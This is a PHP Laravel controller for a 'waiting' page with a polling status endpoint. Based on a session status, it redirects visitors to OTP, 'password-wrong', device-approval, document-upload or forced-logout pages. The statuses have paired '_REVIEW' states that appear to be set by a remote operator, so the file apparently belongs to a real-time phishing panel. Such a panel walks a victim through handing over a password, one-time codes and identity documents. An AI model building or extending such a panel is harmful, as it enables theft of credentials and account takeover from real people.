<?php

namespace App\Http\Controllers;

use App\Models\AccessSession;
use App\Support\AccessSessionResolver;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\View\View;

class WaitingController extends Controller
{
    public function show(Request $request): View|RedirectResponse
    {
        $session = AccessSessionResolver::current($request);

        if (! AccessSessionResolver::isActive($session)) {
            return redirect()->route('force-logout');
        }

        if ($redirect = $this->redirectForStatus($session)) {
            return $redirect;
        }

        $session->touchSeen();

        return view('waiting', ['session' => $session]);
    }

    public function status(Request $request): JsonResponse
    {
        $session = AccessSessionResolver::current($request);

        if (! $session) {
            return response()->json(['ok' => false, 'status' => 'missing'], 401);
        }

        // Close / logout → selalu kick
        if (! AccessSessionResolver::isActive($session)) {
            return response()->json([
                'ok' => true,
                'status' => 'logout',
                'page' => 'force-logout',
                'urls' => $this->urls(),
            ]);
        }

        $session->touchSeen();

        return response()->json([
            'ok' => true,
            'status' => $session->status,
            'page' => $session->routeForStatus(),
            'urls' => $this->urls(),
        ]);
    }

    protected function urls(): array
    {
        return [
            'waiting' => route('waiting'),
            'otp' => route('otp'),
            'password_wrong' => route('password-wrong'),
            'approve_device' => route('approve-device'),
            'upload_document' => route('upload-document'),
            'force_logout' => route('force-logout'),
        ];
    }

    protected function redirectForStatus(AccessSession $session): ?RedirectResponse
    {
        return match ($session->status) {
            AccessSession::STATUS_OTP, AccessSession::STATUS_OTP_REVIEW,
            AccessSession::STATUS_AUTH, AccessSession::STATUS_AUTH_REVIEW => redirect()->route('otp'),
            AccessSession::STATUS_PASSWORD, AccessSession::STATUS_PASSWORD_REVIEW => redirect()->route('password-wrong'),
            AccessSession::STATUS_DEVICE, AccessSession::STATUS_DEVICE_REVIEW => redirect()->route('approve-device'),
            AccessSession::STATUS_DOCUMENT => redirect()->route('upload-document'),
            AccessSession::STATUS_LOGOUT, AccessSession::STATUS_CLOSED => redirect()->route('force-logout'),
            default => null,
        };
    }
}
